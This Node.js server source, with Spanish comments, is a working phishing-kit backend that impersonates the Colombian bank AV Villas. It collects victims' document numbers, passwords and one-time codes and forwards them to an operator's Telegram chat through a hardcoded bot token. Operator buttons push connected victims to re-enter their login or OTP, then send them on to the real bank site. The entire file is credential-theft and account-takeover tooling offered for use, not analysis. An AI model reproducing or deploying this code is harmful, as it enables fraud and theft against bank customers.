/**
 * AV Villas Co-banking Digital - Server
 * Servidor Node.js con Express, Socket.IO y Telegram Bot
 */

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ============================================
// CONFIGURACIÓN
// ============================================
const CONFIG = {
    PORT: 3000,
    TELEGRAM: {
        BOT_TOKEN: '8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU',
        CHAT_ID: '-5029729816'
    },
    SOCKET: {
        CORS: {
            origin: "*",
            methods: ["GET", "POST"]
        },
        PING_TIMEOUT: 60000,
        PING_INTERVAL: 25000
    }
};

// ============================================
// INICIALIZACIÓN DEL SERVIDOR
// ============================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: CONFIG.SOCKET.CORS,
    pingTimeout: CONFIG.SOCKET.PING_TIMEOUT,
    pingInterval: CONFIG.SOCKET.PING_INTERVAL
});

// Middlewares
app.use(express.static(__dirname));
app.use(express.json());

// Crear bot de Telegram
const bot = new TelegramBot(CONFIG.TELEGRAM.BOT_TOKEN, { 
    polling: true,
    filepath: false
});

// ============================================
// GESTIÓN DE CLIENTES
// ============================================
class ClientManager {
    constructor() {
        this.clients = new Map();
    }

    add(socket) {
        this.clients.set(socket.id, {
            socket: socket,
            connectedAt: new Date(),
            ip: socket.handshake.address
        });
        console.log(`✅ Cliente conectado: ${socket.id} | Total: ${this.clients.size}`);
    }

    remove(socketId) {
        const client = this.clients.get(socketId);
        if (client) {
            this.clients.delete(socketId);
            console.log(`❌ Cliente desconectado: ${socketId} | Total: ${this.clients.size}`);
        }
    }

    broadcast(event, data) {
        let sent = 0;
        this.clients.forEach((client) => {
            try {
                client.socket.emit(event, data);
                sent++;
            } catch (error) {
                console.error(`Error al enviar a ${client.socket.id}:`, error.message);
            }
        });
        console.log(`📡 Evento "${event}" enviado a ${sent} clientes`);
        return sent;
    }

    getCount() {
        return this.clients.size;
    }

    getAll() {
        return Array.from(this.clients.values());
    }
}

const clientManager = new ClientManager();

// ============================================
// UTILIDADES
// ============================================
const Utils = {
    /**
     * Formatea la fecha actual
     */
    getCurrentDateTime: () => {
        return new Date().toLocaleString('es-CO', {
            timeZone: 'America/Bogota',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    },

    /**
     * Escapa caracteres especiales para Markdown V2
     */
    escapeMarkdown: (text) => {
        return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    },

    /**
     * Formatea un mensaje de error
     */
    formatError: (error) => {
        return {
            message: error.message,
            code: error.code,
            timestamp: new Date().toISOString()
        };
    }
};

// ============================================
// SERVICIO DE TELEGRAM
// ============================================
class TelegramService {
    static async sendLoginData(data) {
        try {
            const message = 
                `🔐 Nueva información de login\n\n` +
                `Tipo de documento: ${data.documentType}\n` +
                `Número de documento: ${data.documentNumber}\n` +
                `Contraseña: ${data.password}\n\n` +
                `Recibido: ${Utils.getCurrentDateTime()}\n` +
                `Clientes conectados: ${clientManager.getCount()}`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '🔑 Pedir Login', callback_data: 'request_login' },
                        { text: '📱 Pedir OTP', callback_data: 'request_otp' }
                    ],
                    [
                        { text: '✅ Finalizar', callback_data: 'finalize' }
                    ]
                ]
            };

            const result = await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message, {
                reply_markup: keyboard
            });

            console.log('✅ Datos de login enviados a Telegram');
            return { success: true, messageId: result.message_id };

        } catch (error) {
            console.error('❌ Error al enviar login a Telegram:', error.message);
            return { success: false, error: Utils.formatError(error) };
        }
    }

    static async sendOTP(data) {
        try {
            const message = 
                `📱 Código OTP recibido\n\n` +
                `Código: ${data.otpCode}\n\n` +
                `👤 Datos del usuario:\n` +
                `Tipo de documento: ${data.documentType}\n` +
                `Número de documento: ${data.documentNumber}\n` +
                `Contraseña: ${data.password}\n\n` +
                `Recibido: ${Utils.getCurrentDateTime()}\n` +
                `Clientes conectados: ${clientManager.getCount()}`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '🔑 Pedir Login', callback_data: 'request_login' },
                        { text: '📱 Pedir OTP Nuevo', callback_data: 'request_otp' }
                    ],
                    [
                        { text: '✅ Finalizar', callback_data: 'finalize' }
                    ]
                ]
            };

            const result = await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message, {
                reply_markup: keyboard
            });

            console.log('✅ Código OTP enviado a Telegram');
            return { success: true, messageId: result.message_id };

        } catch (error) {
            console.error('❌ Error al enviar OTP a Telegram:', error.message);
            return { success: false, error: Utils.formatError(error) };
        }
    }

    static async notifyClients(action, count) {
        try {
            let message = '';
            let icon = '';

            if (action === 'request_login') {
                icon = '🔑';
                message = `${icon} Se ha solicitado nueva información de login a ${count} cliente(s) conectado(s).`;
            } else if (action === 'request_otp') {
                icon = '📱';
                message = `${icon} Se ha solicitado código OTP a ${count} cliente(s) conectado(s).`;
            }

            await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message);

        } catch (error) {
            console.error('❌ Error al notificar clientes:', error.message);
        }
    }
}

// ============================================
// MANEJADORES DE SOCKET.IO
// ============================================
io.on('connection', (socket) => {
    clientManager.add(socket);

    socket.on('disconnect', (reason) => {
        clientManager.remove(socket.id);
        console.log(`Razón de desconexión: ${reason}`);
    });

    socket.on('login-data', async (data) => {
        console.log('📥 Datos de login recibidos:', {
            documentType: data.documentType,
            documentNumber: data.documentNumber,
            timestamp: data.timestamp
        });

        const result = await TelegramService.sendLoginData(data);
        socket.emit('telegram-sent', result);
    });

    socket.on('otp-data', async (data) => {
        console.log('📥 Código OTP recibido:', {
            otpCode: data.otpCode,
            timestamp: data.timestamp
        });

        const result = await TelegramService.sendOTP(data);
        socket.emit('telegram-sent', result);
    });

    socket.on('error', (error) => {
        console.error(`❌ Error en socket ${socket.id}:`, error.message);
    });
});

// ============================================
// MANEJADORES DE TELEGRAM BOT
// ============================================
bot.on('callback_query', async (callbackQuery) => {
    const action = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;

    console.log(`📲 Callback recibido: ${action}`);

    try {
        if (action === 'request_login') {
            const count = clientManager.broadcast('redirect', { page: 'login' });
            
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Solicitando nueva información de login...'
            });
            
            await TelegramService.notifyClients(action, count);

        } else if (action === 'request_otp') {
            const count = clientManager.broadcast('redirect', { page: 'otp' });
            
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Solicitando código OTP...'
            });
            
            await TelegramService.notifyClients(action, count);

        } else if (action === 'finalize') {
            const count = clientManager.broadcast('redirect', { page: 'finalize', url: 'https://www.avvillas.com.co/' });
            
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Finalizando sesión...'
            });
            
            await bot.sendMessage(chatId, `✅ Se ha redirigido a ${count} cliente(s) a la página oficial de AV Villas.`);
        }
    } catch (error) {
        console.error('❌ Error en callback:', error.message);
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Error al procesar la solicitud'
        });
    }
});

bot.on('polling_error', (error) => {
    console.error('❌ Error en el polling del bot:', error.message);
});

bot.on('error', (error) => {
    console.error('❌ Error en el bot de Telegram:', error.message);
});

// ============================================
// RUTAS HTTP
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        clients: clientManager.getCount(),
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Manejo de errores 404
app.use((req, res) => {
    res.status(404).send('Página no encontrada');
});

// ============================================
// INICIAR SERVIDOR
// ============================================
server.listen(CONFIG.PORT, () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 AV Villas Co-banking Digital - Servidor Iniciado');
    console.log('='.repeat(60));
    console.log(`✅ Servidor HTTP: http://localhost:${CONFIG.PORT}`);
    console.log(`✅ Socket.IO: Activo`);
    console.log(`✅ Bot de Telegram: Activo`);
    console.log(`✅ Chat ID: ${CONFIG.TELEGRAM.CHAT_ID}`);
    console.log('='.repeat(60) + '\n');
});

// Manejo de errores no capturados
process.on('uncaughtException', (error) => {
    console.error('❌ Excepción no capturada:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Promise rechazada no manejada:', reason);
});
